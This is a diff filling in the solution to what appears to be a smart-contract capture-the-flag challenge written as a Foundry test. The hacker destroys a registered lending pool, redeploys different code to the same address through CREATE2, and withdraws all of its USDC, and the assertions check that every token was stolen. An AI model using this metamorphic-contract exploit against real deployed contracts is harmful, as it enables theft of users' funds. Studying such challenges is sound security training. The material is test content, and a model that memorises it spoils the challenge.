@@ -42,8 +42,10 @@ contract Challenge3Test is Test {
         // deploying the LendingPool contract
         vm.startPrank(hacker);
         create2Deployer = new Create2Deployer();
+        
         createDeployer = CreateDeployer(create2Deployer.deploy());
         lendingPool = LendingPool(createDeployer.deploy(true, address(usdc)));
+        console.log("Before Deployed addresses : Deployer : ",address(createDeployer)," pool:",address(lendingPool));
         vm.stopPrank();
 
         /* sending transactions as the governance owner */
@@ -72,15 +74,21 @@ contract Challenge3Test is Test {
         // forge test --match-contract Challenge3Test -vvvv                   //
         //////////////////////////////////////////////////////////////////////*/
 
+        // Deletion existing addresses
 
 
-    
+        createDeployer.cleanUp();
+        lendingPool.emergencyStop();
+
+
         //====================================================================//
         vm.stopPrank();
     }
 
     function testExploit() public {
         vm.startPrank(hacker);
+        address lendingPoolAddressBefore=address(lendingPool);
+
         /*//////////////////////////////////////////////////////////////
         //                    Add your hack below!                    //
         //                        Hack part #2                        //
@@ -88,7 +96,14 @@ contract Challenge3Test is Test {
         // terminal command to run the specific test:                 //
         // forge test --match-contract Challenge3Test -vvvv           //
         //////////////////////////////////////////////////////////////*/
+        // deploy on same address
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+        address new_lending_pool_address = address(LendingHack(createDeployer.deploy(false, address(usdc))));
 
+        console.log("After Deployed addresses : Deployer : ",address(createDeployer)," pool:",new_lending_pool_address);
+
+        LendingHack(lendingPoolAddressBefore).withdraw();
+        console.log("contract balance is ",usdc.balanceOf(lendingPoolAddressBefore));
 
 
 
@@ -96,10 +111,11 @@ contract Challenge3Test is Test {
         vm.stopPrank();
 
         assertEq(
-            lendExGovernor.getPoolName(address(lendingPool)),
+            lendExGovernor.getPoolName(address(lendingPoolAddressBefore)),
             "LendingPool hack",
             "lendingPool contract address now gives a different name"
         );
         assertEq(usdc.balanceOf(hacker), usdcAmount, "Hacker has to steal all the stablecoin tokens");
+
     }
 }
